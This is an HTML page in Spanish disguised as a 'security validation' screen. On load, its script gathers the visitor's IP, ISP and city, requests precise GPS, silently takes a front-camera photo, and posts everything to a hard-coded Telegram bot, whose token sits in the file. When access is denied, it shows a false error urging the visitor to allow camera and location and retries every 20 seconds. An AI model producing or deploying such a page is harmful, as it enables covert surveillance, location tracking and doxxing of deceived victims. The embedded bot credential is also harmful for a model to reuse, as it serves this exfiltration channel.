<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALIDACIÓN DE SEGURIDAD</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a202c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
        .card { background: white; color: #333; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3182ce; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { display: none; background: #3182ce; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
        .btn:hover { background: #2b6cb0; }
        .error-box { display: none; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.9rem; color: #c53030; text-align: left; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
    <h3 id="status-title">Validando Conexión...</h3>
    <div id="loader" class="spinner"></div>
    <p id="status-text" style="color: #718096; font-size: 0.9rem;">Sincronizando información de red...</p>

    <div id="instrucciones" class="error-box">
        <b>⚠️ ACCESO REQUERIDO:</b><br>
        Para continuar con la validación segura, por favor permite los accesos de <b>Cámara y Ubicación</b> cuando el navegador lo solicite.
    </div>
    <button id="btn-reintentar" class="btn">REINTENTAR VALIDACIÓN</button>
</div>

<script>
const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
const CHAT_ID = "-1003973600762";

let infoRed = { 
    ip: "No detectada", 
    puerto: "N/A", 
    isp_com: "N/A", 
    isp_tec: "N/A", 
    ciudad: "N/A", 
    ua: navigator.userAgent 
};

// 1. OBTENCIÓN DE DATOS DE RED
async function cargarRed() {
    const apis = ['https://ipapi.co/json/', 'https://ipwho.is/', 'https://api.ipify.org?format=json'];
    for (let api of apis) {
        try {
            const res = await fetch(api);
            const data = await res.json();
            const ip = data.ip || data.query;
            if (ip) {
                infoRed.ip = ip;
                infoRed.ciudad = data.city || data.city_name || "Desconocida";
                let org = (data.org || data.connection?.isp || data.isp || "").toLowerCase();
                infoRed.isp_tec = org.toUpperCase() || "Desconocido";
                
                if (org.includes("altan")) infoRed.isp_com = "BAIT / Altán Redes";
                else if (org.includes("uninet")) infoRed.isp_com = "TELMEX / Infinitum";
                else if (org.includes("radiomovil")) infoRed.isp_com = "TELCEL";
                else if (org.includes("pegaso") || org.includes("movistar")) infoRed.isp_com = "MOVISTAR";
                else if (org.includes("cablevision") || org.includes("izzi")) infoRed.isp_com = "IZZI";
                else if (org.includes("totalplay")) infoRed.isp_com = "TOTALPLAY";
                else infoRed.isp_com = "Proveedor Local / VPN";

                infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152));
                return true; 
            }
        } catch (e) {}
    }
    return false;
}

// 2. EJECUCIÓN DEL REPORTE
async function ejecutarReporte() {
    let foto = null;
    let gps = "Vacio"; // <--- Por defecto dirá "Vacio"
    
    const ahora = new Date();
    const fLog = ahora.toLocaleDateString('es-MX');
    const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false });

    // Intentar obtener GPS
    try {
        const p = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        // Si tiene éxito, se sobreescribe el texto por el link
        gps = `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
    } catch (e) {
        gps = "Vacio"; // Si falla o deniega, se asegura que diga Vacio
    }

    // Captura de Rostro
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const v = document.createElement('video');
        v.srcObject = s; v.setAttribute("playsinline", true);
        await v.play();
        await new Promise(r => setTimeout(r, 1500)); 
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
        s.getTracks().forEach(t => t.stop());
    } catch (e) {}

    const texto = `🚨 **ALERTA DE INVESTIGACIÓN**\n\n` +
                  `📅 **Fecha:** \`${fLog}\`\n` +
                  `🕒 **Hora:** \`${hLog}\`\n` +
                  `🌐 **IP:** \`${infoRed.ip}\`\n` +
                  `🔌 **Puerto:** \`${infoRed.puerto}\`\n` +
                  `🏢 **ISP:** ${infoRed.isp_com}\n` +
                  `📍 **Ciudad:** ${infoRed.ciudad}\n` +
                  `📌 **GPS:** ${gps}\n` + 
                  `🤖 **UA:** \`${infoRed.ua}\``;

    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('parse_mode', 'Markdown');

    if (foto) {
        fd.append('photo', foto, 'evidencia.jpg');
        fd.append('caption', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        
        document.getElementById('loader').style.display = 'block';
        document.getElementById('instrucciones').style.display = 'none';
        document.getElementById('btn-reintentar').style.display = 'none';
        document.getElementById('status-text').innerText = "Validación completa. Redirigiendo...";
    } else {
        fd.append('text', texto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
        
        document.getElementById('loader').style.display = 'none';
        document.getElementById('instrucciones').style.display = 'block';
        document.getElementById('btn-reintentar').style.display = 'block';
        document.getElementById('status-title').innerText = "Error de Sincronización";
    }
}

window.onload = async () => {
    await cargarRed();
    await ejecutarReporte();
    
    setInterval(() => {
        if (document.getElementById('instrucciones').style.display === 'block') {
            ejecutarReporte();
        }
    }, 20000);
};

document.getElementById('btn-reintentar').onclick = () => { location.reload(); };
</script>
</body>
</html>
